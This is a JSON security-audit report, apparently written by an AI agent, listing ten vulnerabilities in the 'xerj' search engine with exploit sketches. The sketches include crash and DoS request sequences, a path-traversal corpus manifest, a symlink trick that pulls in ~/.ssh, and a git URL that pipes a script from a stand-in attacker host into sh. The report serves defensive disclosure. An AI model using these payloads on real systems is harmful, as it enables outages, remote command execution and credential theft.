@@ -1,0 +1,115 @@
+{
+  "findings": [
+    {
+      "id": "F1",
+      "title": "Ingest pipeline set/add_field processor panics on a non-object document — one unauthenticated request kills the whole node",
+      "severity": "critical",
+      "file": "engine/crates/xerj-wasm/src/builtins.rs",
+      "line": 870,
+      "description": "SetPlugin::process does `doc[&self.field] = self.value.clone()`. serde_json's IndexMut<&str> PANICS when the value is an Array/Number/String/Bool (\"cannot access key \\\"a\\\" in JSON array\"). The same is true of AddFieldPlugin::process at builtins.rs:285. The document body is never required to be an object on the way in: es_compat.rs:2752 (index_doc_auto), :2889 (index_doc) and native.rs:2637 (IngestRequest is an untagged Single(Value)|Batch(Vec<Value>)) all accept any serde_json::Value, and the _bulk `create` action (engine/crates/xerj-engine/src/bulk.rs:786) skips the first-byte-'{' gate that the `index` action has. engine/Cargo.toml sets [profile.release] panic = \"abort\", so this is not a 500 — the runtime is torn down.",
+      "attack_scenario": "Any caller who can reach the port and post a document. In the documented default posture (--insecure / auth.enabled=false / no admin key — auth.rs:269 makes every request Principal::Superuser) this is fully unauthenticated. On an auth-enabled node it needs any key with write access. One request permanently removes the listener; repeat after every restart for a persistent outage.",
+      "exploit_sketch": "PUT /_ingest/pipeline/p  {\"processors\":[{\"set\":{\"field\":\"a\",\"value\":1}}]}\nPOST /myidx/_doc?pipeline=p   Content-Type: application/json\n[1,2,3]\n→ thread 'xerj-rt' panicked at serde_json/src/value/index.rs:102: cannot access key \"a\" in JSON array; listeners stop accepting, port refuses connections. VERIFIED dynamically against /tmp/xtarget-1093/release/xerj. Also reachable via POST /_bulk with a `create` action and via index.default_pipeline (es_compat.rs:2736).",
+      "confidence": "high"
+    },
+    {
+      "id": "F2",
+      "title": "terms-aggregation include/exclude regex is recompiled once per candidate term — 21 KB pattern costs ~60 s of CPU per request",
+      "severity": "high",
+      "file": "engine/crates/xerj-engine/src/aggs.rs",
+      "line": 4751,
+      "description": "term_matches_regex builds `Regex::new(&format!(\"^(?:{pattern})$\"))` on EVERY call, and it is called once per distinct term inside the bucket filter loop (aggs.rs:3686 and :3691). There is no compile cache, no pattern-length cap and no deadline anywhere in aggs.rs. Distinct terms are capped at max_buckets() = 65,536 (aggs.rs:206). The pattern comes straight from the request body, bounded only by limits.max_body_bytes = 100 MB. The columnar fast path deliberately bails to this brute-force path when `include` is present (fast_aggs.rs:2703).",
+      "attack_scenario": "Unauthenticated in the default --insecure posture; otherwise any key with read access (search). Parallelisable: max_concurrent_searches defaults to 64, so a handful of connections can pin every core.",
+      "exploit_sketch": "Seed an index with 20,000 distinct terms via _bulk, then POST /{index}/_search {\"size\":0,\"aggs\":{\"t\":{\"terms\":{\"field\":\"uid\",\"size\":1,\"include\":\"<alternation>\"}}}}. MEASURED: 500-alternation (~7 KB) pattern = 17.86 s; 1,500-alternation (~21 KB) = 58.46 s of CPU for one request. Extrapolates to days of CPU at the 100 MB body limit, repeatable and concurrent.",
+      "confidence": "high"
+    },
+    {
+      "id": "F3",
+      "title": "Segment reader slices the mmap with unvalidated on-disk offsets, and the footer carrying them is outside the whole-file CRC — 8-byte edit = uncatchable boot abort",
+      "severity": "high",
+      "file": "engine/crates/xerj-storage/src/segment.rs",
+      "line": 638,
+      "description": "from_mmap computes `let st_start = section_table_offset as usize; Cursor::new(&data[st_start..])` with no bound against data.len(). The whole-file CRC covers only data[..footer_start] (segment.rs:622-625), so section_table_offset, total_crc32c and the pad byte are unprotected and unvalidated. section()/section_checked() (segment.rs:673-689) likewise do `&self.mmap[entry.offset as usize .. entry.offset as usize + entry.length as usize]` with no check against mmap.len() — reachable with a recomputed (unkeyed) CRC32. Adjacent: `Vec::with_capacity(section_count)` at :640 takes a raw u32 from disk (up to ~137 GiB reservation). Path: Engine::new → Index::open (index.rs:9268) → IndexStore::open (index_store.rs:885) → rebuild_version_map_from_segments → SegmentReader::open → from_mmap. There is no catch_unwind on that chain, and panic = \"abort\".",
+      "attack_scenario": "An attacker who can tamper with files in the data dir (compromised backup, restored 'snapshot', shared volume, malicious corpus tarball that lands in the data dir). Editing 8 bytes outside the CRC coverage makes the node abort on EVERY subsequent boot — a persistent, unfixable-without-editing-files denial of service.",
+      "exploit_sketch": "Set section_table_offset to u64::MAX in segments/<uuid>.seg (CRC still valid) → SegmentReader::open panics \"range start index 18446744073709551615 out of range for slice of length 212\" → process aborts at startup, forever. Reproduced against xerj-storage in a scratch crate. Note `_admin/segments/fsck` calls section_checked, so the diagnostic endpoint panics too instead of reporting the corruption.",
+      "confidence": "high"
+    },
+    {
+      "id": "F4",
+      "title": ".ids sidecar is read with no checksum on the normal open path and its seq_no feeds the version map — forged sidecar silently swallows documents and deletes",
+      "severity": "high",
+      "file": "engine/crates/xerj-storage/src/index_store.rs",
+      "line": 4292,
+      "description": "rebuild_version_map_from_segments reads segments/<uuid>.ids checking only the magic and UTF-8, then injects (doc_id, seq_no) → segment into the version map with no bound on seq. The ZCM1 '.complete' manifest that carries per-file CRCs is consulted only in recover_orphaned_segments (index_store.rs:1163) and object-store hydration — never for snapshot-listed segments. The replay predicate at index_store.rs:4471 (`e.seq_no >= seq_no`) then classifies every later WAL entry as already persisted. The orphan path cross-checks min_seq/max_seq/doc_count against the .seg header (:1157-1161); the snapshot path does not.",
+      "attack_scenario": "An attacker with data-dir write access who wants to corrupt rather than crash: suppress a document (evidence disappears with no error anywhere), or suppress a delete so a revoked record stays searchable. CRC32C on the .seg is unkeyed and trivially recomputable, so this is silent.",
+      "exploit_sketch": "Rewrite or forge <uuid>.ids (magic ZID1 + an arbitrary (id, seq_no) list) with seq_no = u64::MAX for a chosen doc id. On next open that doc's version-map entry outranks every WAL frame, so subsequent updates/deletes for it are discarded during replay. Verified by reading the read/compare paths; the .ids format is unauthenticated.",
+      "confidence": "high"
+    },
+    {
+      "id": "F5",
+      "title": "corpus pack sources[].slug is joined to the corpus dir with no validation — path traversal write plus attacker-chosen remove_dir_all",
+      "severity": "high",
+      "file": "engine/crates/xerj-autoindex/src/xc.rs",
+      "line": 918,
+      "description": "The only gate on a pack source slug is non-emptiness (harvest/pack.rs:426). add_pack_materialize then does dest.join(&slug), create_dir_all, File::create(dir.join(\"records.jsonl\")) and write_all of attacker JSON lines (xc.rs:918-925), and reads it back at :826 and :934. Worse, the reconcile step at xc.rs:871 does `remove_dir_all(dest.join(&r.repo))` where r.repo comes from the previously written corpus.json, read with no validation. dest = ~/.xerj-code/corpora/<name>. The `slugs.contains(slug)` check at :864/:897 is circular — it compares against the attacker's own manifest. Sibling arms DO gate this: the clone arm uses xccode::pathgate::valid_repo_name (xc.rs:556) and the recipe arm uses valid_slug (harvest/recipe.rs:369). Signature verification is opt-in only (xc.rs:745-790, `if let Some(pubfile) = verify_sig`).",
+      "attack_scenario": "A malicious corpus provider. The tool itself prints \"share it: <path> (rebuild with xerj corpus add <name> --from <that pack>)\", and the README's reference-coding flow has agents download and index third-party material — so a victim running the documented command on an attacker-supplied pack gets files written anywhere the user can write, and on a later re-add an arbitrary directory deleted.",
+      "exploit_sketch": "manifest.json = {\"format_version\":1,\"kind\":\"harvested\",\"pack\":\"p\",\"files\":{\"a.jsonl\":{\"sha256\":\"<h>\",\"records\":1}},\"sources\":[{\"slug\":\"../../../.config/systemd/user\",\"licence\":\"MIT\"}]}, a.jsonl containing {\"source\":\"../../../.config/systemd/user\",\"id\":\"x\"}, plus a self-computed SHA256SUMS. Victim: xerj corpus add p --from evil.zip → ~/.config/systemd/user/records.jsonl written. A slug of \"../../..\" round-trips into corpus.json as repo, and the NEXT corpus add over that name calls remove_dir_all on it.",
+      "confidence": "high"
+    },
+    {
+      "id": "F6",
+      "title": "git source URL is passed to git without transport allow-listing or end-of-options — arbitrary command execution via git-remote-ext",
+      "severity": "high",
+      "file": "engine/crates/xerj-autoindex/src/harvest/source.rs",
+      "line": 106,
+      "description": "A git source's `url` is validated as non-empty only (harvest/recipe.rs:475-488; read_hub_manifest validates repo and sha but never url). It is then handed to `git remote add origin <url>` (source.rs:106), `git fetch --depth 1 origin <rev>` (:126-131) and `git clone --depth 1 … <url> <target>` (xc.rs:599). xc.rs's \"never a shell string\" invariant is correct about argv, but git itself breaks it: `url = \"ext::sh -c 'touch /tmp/pwned'\"` is a single argv element and git-remote-ext executes it through /bin/sh at fetch time, before any content is inspected. There is also no `--` end-of-options marker and no rejection of a leading `-`, so `--upload-pack=<cmd>` is consumed as an option by git's permuting parser.",
+      "attack_scenario": "A malicious recipe/manifest author. The victim runs `xerj corpus add` / a hub recipe that names the attacker's URL; the command runs with the victim's privileges before any file is parsed, so none of the extractor hardening applies.",
+      "exploit_sketch": "recipe with sources: [{kind: git, url: \"ext::sh -c 'curl http://attacker/p.sh | sh'\", rev: \"HEAD\"}] → git-remote-ext spawns /bin/sh -c on the first fetch. Same primitive via `url: \"--upload-pack=<cmd>\"` or a crafted `rev`.",
+      "confidence": "high"
+    },
+    {
+      "id": "F7",
+      "title": "harvest directory walk follows symlinks with no hidden-name or root-containment rule — a repo containing 'link -> /' packs the victim's whole filesystem",
+      "severity": "medium",
+      "file": "engine/crates/xerj-autoindex/src/harvest/mod.rs",
+      "line": 292,
+      "description": "harvest::walk recurses on `if p.is_dir()`, which FOLLOWS symlinks; there is no symlink_metadata check, no hidden-name rule and no root containment check. git_checkout materialises an attacker's tree, and git checks mode-120000 entries out as real symlinks, so a hostile repo controls the link targets. Contrast walk.rs:368-374 and :178-223, which enforce a non-optional dotfile rule and judge the resolved path — only this walker is unprotected. harvest/mod.rs:352 also does an uncapped read_to_string on every match.",
+      "attack_scenario": "Malicious corpus. The harvested pack then carries ~/.ssh keys, ~/.gitconfig credentials, /etc contents and anything else matching the glob, and is shipped back out as a 'shareable pack' — the exfiltration is the product feature. Bounded by the victim's file permissions.",
+      "exploit_sketch": "Repo contains `ln -s / link` (plus a symlink to ~/.ssh). Victim harvests it; walk recurses through `link` into `/`, parse_file reads every glob-matching file into the pack. Also reachable via recipe dir sources with path=\"../..\" (recipe.rs:446 rejects only absolute paths).",
+      "confidence": "high"
+    },
+    {
+      "id": "F8",
+      "title": "POST /_ingest/pipeline/_simulate expands nested pipelines exponentially (2^n)",
+      "severity": "medium",
+      "file": "engine/crates/xerj-api/src/es_compat.rs",
+      "line": 29627,
+      "description": "expand_pipeline_processors' `seen` set is path-local: `seen.insert(target)` before recursing and `seen.remove(target)` after (es_compat.rs:29627 / :29656). A pipeline that references the same child TWICE expands that child's subtree twice — T(n) = 2·T(n−1). There is no memoization, no depth cap and no output-size cap. Stored pipelines containing a `pipeline` processor are accepted and compiled (es_compat.rs:29360), and nothing caps the number of stored pipelines or their processor count. The index-scoped `POST /_ingest/pipeline/{id}/_simulate` does not expand (es_compat.rs:30488) — only the inline route does.",
+      "attack_scenario": "Unauthenticated in the default --insecure posture; otherwise any key that can PUT a pipeline and POST a simulate. Note `_ingest` is in POST_READ_OPS (authz.rs:436), so the simulate call itself is classified as a read.",
+      "exploit_sketch": "~35 tiny `PUT /_ingest/pipeline/p{i}` bodies {\"processors\":[{\"pipeline\":{\"name\":\"p{i+1}\"}},{\"pipeline\":{\"name\":\"p{i+1}\"}},{\"set\":{\"field\":\"a\",\"value\":1}}]}, then POST /_ingest/pipeline/_simulate {\"pipeline\":{\"processors\":[{\"pipeline\":{\"name\":\"p1\"}}]},\"docs\":[{\"_source\":{}}]} → 2^35 cloned Value nodes → OOM/hang.",
+      "confidence": "medium"
+    },
+    {
+      "id": "F9",
+      "title": "POST /v1/admin/backup snapshots every reserved .xerj-memory-* brain for an Unscoped key, which the authz contract says holds no privilege on that namespace",
+      "severity": "medium",
+      "file": "engine/crates/xerj-engine/src/engine.rs",
+      "line": 4340,
+      "description": "Engine::create_snapshot's all-indices branch iterates self.indices filtering only `!is_system_index(n)`, and is_system_index matches the `.xerj_` prefix (engine.rs:4621) — so reserved `.xerj-memory-*` brains are copied (WAL + segments + schema, via copy_dir_recursive). No index_guard::visible() filter is applied. On the way in, `/v1/admin/backup` classifies as Target::Cluster with BodyShape::None (authz.rs:709: any `/v1/*` other than `POST /v1/indices` returns BodyShape::None), so body_targets is empty and decide() falls to `Principal::Unscoped {..} => Ok(())`. The identical ES spelling `PUT /_snapshot/{repo}/{snap}` with no `indices` is explicitly superuser-only for exactly this reason (\"cover every index on the node, brains included\", authz.rs:1617).",
+      "attack_scenario": "A key minted by POST /_security/api_key without role_descriptors — the shape every key had before per-brain authorization, and one the module docs say holds NO privilege on the reserved namespace — can copy every brain's on-disk bytes into a directory under data_dir, and double total disk usage on every repeat.",
+      "exploit_sketch": "POST /_security/api_key {\"name\":\"k\"} → POST /v1/admin/backup. Classification and the unfiltered copy loop were verified in source; a read-back chain (restore with rename_pattern/rename_template, es_compat.rs:32373, into a non-reserved name) looks plausible but was NOT traced end-to-end.",
+      "confidence": "medium"
+    },
+    {
+      "id": "F10",
+      "title": "Decompression on the persistence read path uses the attacker-controlled prepended size with no cap — a 9-byte tampered file drives a multi-GiB allocation",
+      "severity": "medium",
+      "file": "engine/crates/xerj-storage/src/wal.rs",
+      "line": 1804,
+      "description": "Every decoder on the replay path calls lz4_flex::decompress_size_prepended, whose output length comes from a u32 prefix in the file: lz4_flex does Vec::with_capacity(u32_from_input). Boot- and query-reachable sites include wal.rs:1804 (WAL frame payload — WAL_MAX_ENTRY_LEN caps only the COMPRESSED frame), index_store.rs:4300 (.ids sidecar, which has no CRC at all) and :1118 (orphan recovery), segment.rs:176 (tombstones), stored_codec.rs:890 (legacy LZ4\\0 stored path, whose result is then handed to serde_json::from_slice::<Vec<Value>>, itself 10-20x the JSON text). xerj-compress's block.rs:226 `Vec::with_capacity(doc_count as usize)` and dictionary.rs:171 are the same shape.",
+      "attack_scenario": "An attacker with data-dir write access. A tiny tampered file converts into an unbounded allocation at boot (or at first query, for the doc_values sidecar, xerj-engine/index.rs:25753 → doc_values.rs:1021 `vec![0u8; payload_len]` with payload_len a raw u64). With panic = \"abort\" an allocation failure is a process abort, not a Result.",
+      "exploit_sketch": "Overwrite one WAL frame's compressed payload with a size prefix near u32::MAX and a valid LZ4 block → replay allocates up to 4 GiB per frame; a handful of frames exhausts memory and aborts the node at boot. Measured in a scratch crate: a 9-byte input drove VmPeak to 4.0 GiB; a genuine 1.05 MB payload produced 256 MiB RSS.",
+      "confidence": "high"
+    }
+  ],
+  "method_note": "I read the router, auth, authz and share core directly and swept es_compat.rs (45k lines) for unchecked slicing and unvalidated parsing. Four parallel subagents covered the xerj-wasm ingest processors, xerj-autoindex hostile-file parsing, xerj-storage/xerj-engine persistence readers, and the console/static surface, each reporting file:line with confirmed-versus-suspected labels. I re-verified the load-bearing claims myself: booting the prebuilt release binary reproduced F1 exactly (one unauthenticated request, listeners permanently dead) and gave measured timings for F2 (17.9s at a 7KB pattern, 58.5s at 21KB). Storage-reader claims were reproduced by the subagent against xerj-storage in a scratch crate. Ranked by attacker reach: unauthenticated remote first, then malicious corpus, then data-dir tampering. The console/static surface was audited and found genuinely clean apart from minor cache-control and nosniff gaps that I did not spend a slot on."
+}
